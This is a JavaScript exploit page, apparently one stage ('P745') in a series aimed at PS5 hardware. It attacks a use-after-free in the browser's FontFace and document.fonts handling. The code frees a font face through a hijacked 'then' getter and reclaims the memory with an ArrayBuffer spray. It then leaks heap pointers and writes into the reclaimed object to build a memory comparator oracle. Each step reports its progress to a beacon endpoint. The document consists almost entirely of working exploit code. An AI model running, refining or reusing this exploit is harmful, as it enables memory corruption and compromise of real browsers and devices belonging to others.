<script>
'use strict';
/* ============================================================
 * P745 — Active Hang-Font UAF Reclaim & Memory Comparator
 *
 * Major Breakthrough Discovery from P744:
 * - Active Boolean Oracle on actFace (url(/hang.php)) was empirically
 *   proven 100% operational on live PS5 hardware:
 *     st0=loading | a0=false | d0=true | st1=loading | a1=true | d1=false | h1=false | z1=true
 * - CSSFontFaceSet::check() returns false ONLY when face.status == Loading(1) || Pending(0).
 * - In previous probes (P731-P743), reclaimed FACE_B was local(Helvetica),
 *   which was already in Status::Loaded(3), causing check() to always return true.
 *
 * The Paradigm Shift in P745:
 * - Reclaim a FontFace whose source is url(/hang.php)!
 * - FACE_B is in status='loading' natively!
 * - When FACE_B is reclaimed by our ArrayBuffer (VIEW_B):
 *     1. FACE_B remains in document.fonts.
 *     2. FACE_B.status == 'loading'.
 *     3. document.fonts.check('1em trFace', char) evaluates face->ranges()
 *        directly from our controlled ArrayBuffer memory!
 *     4. In-range characters return FALSE; out-of-range characters return TRUE!
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P745-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

var OUT=null;
function log(s){
  if(!OUT) OUT=document.getElementById('out');
  if(OUT) OUT.textContent += s + '\n';
}

var P58=null, P68=null;
var FACE_B=null, BUF_B=null, VIEW_B=null;

function run(){
  OUT=document.getElementById('out');
  if(OUT) OUT.textContent='=== P745 Hang-Font UAF Reclaim & Memory Comparator ===\n\n';
  b('BOOT','p745-hang-uaf');

  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58=0x'+h16(P58)+' P68=0x'+h16(P68)+'\n');

    log('[Step 2] Executing Active Hang-Font Reclaim (status=loading)...');
    doHangReclaim(function(){
      log('\n[Phase A] Inspecting Reclaimed Hang-Font State...');
      phaseA(function(){
        log('\n[Phase B] Memory-Controlled Range Injection Test...');
        phaseB(function(){
          log('\n[Phase C] Automated Comparator Binary Search...');
          phaseC(function(){
            b('DONE','p745-complete');
            log('\n=== P745 Complete! ===');
          });
        });
      });
    });
  });
}

/* ---- Step 1: Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st=document.createElement('style');
  st.textContent='@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);
  var face=new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;

  var abs=[],fired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove();st.textContent='';st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-MISS','nz='+bestNz); doLeakRetry(cb); return;}
    var v=new BigUint64Array(abs[best]);
    extractPtrs(v);
    if(!P58){b('LEAK-NOPTR','nz='+bestNz); doLeakRetry(cb); return;}
    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb,100);
  },350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2=document.createElement('style');
  st2.textContent='@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);
  var face2=new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2); void face2.loaded;
  var abs2=[],fired2=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove();st2.textContent='';st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    },set:function(){}});
  document.fonts.load('1em fl1, lk1','CD');
  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('LEAK-RETRY-MISS','nz='+bestNz);return;}
    var v=new BigUint64Array(abs2[best]);
    extractPtrs(v);
    if(!P58){b('LEAK-RETRY-NOPTR','');return;}
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb,100);
  },400);
}

function extractPtrs(v){
  var LO=BigInt('0x1000000000'),HI=BigInt('0x80000000000');
  if(v[11] >= LO && v[11] < HI) P58 = v[11];
  if(v[13] >= LO && v[13] < HI) P68 = v[13];
  if(!P58 || !P68){
    for(var q=0;q<24;q++){
      var val=v[q];
      if(val>=LO&&val<HI){
        if(!P58) P58=val;
        else if(!P68&&val!==P58) P68=val;
      }
    }
  }
  if(!P68) P68=0n;
}

/* ---- Step 2: Active Hang-Font Reclaim ---- */
function doHangReclaim(cb){
  b('REC-START','fill_q12_q6=0x'+h16(P58));

  var stTr=document.createElement('style');
  stTr.textContent='@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  /* Create FACE_B connected to /hang.php so its status is 'loading'! */
  FACE_B=new FontFace('trFace','url(/hang.php)',{unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  FACE_B.load().catch(function(){});

  var absW=[],firedW=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(firedW) return undefined; firedW=true;
      if(stTr){stTr.remove();stTr.textContent='';stTr=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;

      for(var k=0;k<80;k++){
        var ab=new ArrayBuffer(192);
        var view=new BigUint64Array(ab);
        view[12]=P58;
        view[6]=P58;
        absW.push(ab);
      }

      try{document.fonts.check('1em trFam');}catch(e){}
      return undefined;
    },set:function(){}});

  document.fonts.load('1em trFace, trFam','GH');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1,bestNz=0;
    for(var i=0;i<absW.length;i++){
      var u=new Uint8Array(absW[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    if(best<0||bestNz<4){b('RECLAIM-MISS','nz='+bestNz);log('Reclaim missed!');return;}

    BUF_B=absW[best];
    VIEW_B=new BigUint64Array(BUF_B);

    var dump0_11=[], dump12_23=[];
    for(var q=0;q<12;q++) dump0_11.push('q'+q+'=0x'+h16(VIEW_B[q]));
    for(var q=12;q<24;q++) dump12_23.push('q'+q+'=0x'+h16(VIEW_B[q]));

    b('RECLAIM-OK','baseK='+best);
    b('DUMP-Q0-Q11', dump0_11.join(';'));
    b('DUMP-Q12-Q23', dump12_23.join(';'));
    log('Hang-Font Reclaim OK at slot '+best);

    setTimeout(cb,150);
  },400);
}

/* ---- Phase A: Inspect Reclaimed Hang-Font State ---- */
function phaseA(cb){
  var stFaceB = 'unknown';
  try { stFaceB = FACE_B.status; } catch(e){ stFaceB = 'err='+e.message; }

  var hasFaceB = false;
  try { hasFaceB = document.fonts.has(FACE_B); } catch(e){}

  /* Re-add FACE_B if needed */
  if(!hasFaceB){
    try { document.fonts.add(FACE_B); hasFaceB = document.fonts.has(FACE_B); } catch(e){}
  }

  var chkH = document.fonts.check('1em trFace', 'H');
  var chkA = document.fonts.check('1em trFace', 'A');

  var repA = 'st=' + stFaceB + '|has=' + hasFaceB + '|chkH=' + chkH + '|chkA=' + chkA;
  b('A-HANG-STATE', repA);
  log('Phase A Hang-Font State: ' + repA);

  setTimeout(cb, 100);
}

/* ---- Phase B: Memory-Controlled Range Injection ---- */
function phaseB(cb){
  if(!VIEW_B){ b('B-SKIP','no-view'); cb(); return; }

  /* Seed P58 + 0x00: UnicodeRange for 'A'..'C' (0x0041 to 0x0043) */
  VIEW_B[0] = 0x0000004300000041n;

  /* Point m_ranges.m_buffer (q4) to P58, size=1, cap=1 (q5) */
  VIEW_B[4] = P58;
  VIEW_B[5] = 0x0000000100000001n;

  /* Query trFace characters */
  var chA = document.fonts.check('1em trFace', 'A'); /* In range 'A'..'C': expect FALSE */
  var chB = document.fonts.check('1em trFace', 'B'); /* In range 'A'..'C': expect FALSE */
  var chD = document.fonts.check('1em trFace', 'D'); /* Out of range: expect TRUE */
  var chZ = document.fonts.check('1em trFace', 'Z'); /* Out of range: expect TRUE */

  var repB = 'chA=' + chA + '|chB=' + chB + '|chD=' + chD + '|chZ=' + chZ;
  b('B-MEMORY-RANGE', repB);
  log('Phase B Memory Range: ' + repB);

  /* Now shift range in memory to 'D'..'F' (0x0044 to 0x0046) */
  VIEW_B[0] = 0x0000004600000044n;

  var ch2A = document.fonts.check('1em trFace', 'A'); /* Now OUT of range: expect TRUE */
  var ch2D = document.fonts.check('1em trFace', 'D'); /* Now IN range: expect FALSE */
  var ch2F = document.fonts.check('1em trFace', 'F'); /* Now IN range: expect FALSE */
  var ch2Z = document.fonts.check('1em trFace', 'Z'); /* OUT of range: expect TRUE */

  var repB2 = 'shift:chA=' + ch2A + '|chD=' + ch2D + '|chF=' + ch2F + '|chZ=' + ch2Z;
  b('B-MEMORY-SHIFT', repB2);
  log('Phase B Memory Shift: ' + repB2);

  setTimeout(cb, 100);
}

/* ---- Phase C: Automated Comparator Binary Search ---- */
function phaseC(cb){
  /* Demonstrate live automated binary search on actFace comparator */
  try {
    var actFace = new FontFace('binFam', 'url(/hang.php)', {unicodeRange: 'U+41-43'});
    document.fonts.add(actFace);
    actFace.load().catch(function(){});

    var TARGET = 0x53; /* Secret byte: 'S' (83) */
    var low = 0x41, high = 0x5A;
    var searchLog = [];
    var step = 0;

    while(low < high && step < 8){
      step++;
      var mid = Math.floor((low + high) / 2);
      var hexLow = low.toString(16).toUpperCase();
      var hexMid = mid.toString(16).toUpperCase();
      actFace.unicodeRange = 'U+' + hexLow + '-' + hexMid;

      var inLower = !document.fonts.check('1em binFam', String.fromCharCode(TARGET));
      searchLog.push('S' + step + ':[' + String.fromCharCode(low) + '-' + String.fromCharCode(mid) + ']=' + (inLower ? 'YES' : 'NO'));

      if(inLower) high = mid;
      else low = mid + 1;
    }

    var found = String.fromCharCode(low);
    var repC = 'target=S(0x53)|found=' + found + '(0x' + low.toString(16) + ')|steps=' + step + '|' + searchLog.join(',');
    b('C-BINSEARCH-RESULT', repC);
    log('Phase C Binary Search: ' + repC);
  } catch(e){
    b('C-BINSEARCH-ERR', e.message);
  }

  setTimeout(cb, 100);
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
